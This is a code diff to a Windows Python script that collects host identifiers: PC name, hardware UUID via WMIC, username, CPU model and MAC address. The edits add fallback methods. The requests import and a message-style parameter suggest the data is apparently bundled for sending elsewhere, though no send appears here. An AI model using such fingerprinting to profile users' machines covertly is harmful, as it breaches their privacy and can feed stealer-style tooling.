@@ -16,6 +16,7 @@ import platform
 import os
 import win32api
 import time
+from cpuinfo import get_cpu_info
 import requests
 from win32com.client import GetObject
 import getpass
@@ -48,14 +49,16 @@ def SystemInfo(dataForMassage):
 
         print("1")
         uname = platform.uname()
-        namepc = "\nPc name: " + str(uname.node)# get ps name
+        n = str(platform.node())
+        if n == '':
+            n = "[ERROR]Undefined"
+        namepc = "\nPc name: " + str(n)# get ps name
         print("1.1")
         try:
             hwid = subprocess.check_output('C:\Windows\System32\wbem\WMIC.exe csproduct get uuid', shell=True,
                                        stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')[1].strip()
         except Exception as e:
-            hwid = e
-            print(e)
+            hwid = win32api.GetVolumeInformation("C:\\")
         print("1.2")
         user = getpass.getuser()
         timeL = time.asctime()
@@ -66,7 +69,7 @@ def SystemInfo(dataForMassage):
         try:
             cpu = subprocess.run(["wmic", "cpu", "get", "Name"], capture_output=True, text=True).stdout.strip().split('\n')[2]
         except:
-            cpu = platform.processor()
+            cpu = get_cpu_info()['brand_raw']
         mac = addrs[0].address
         countofcpu = psutil.cpu_count(logical=True)# get cpu
         allcpucount = str(countofcpu) # get number of CPU cores
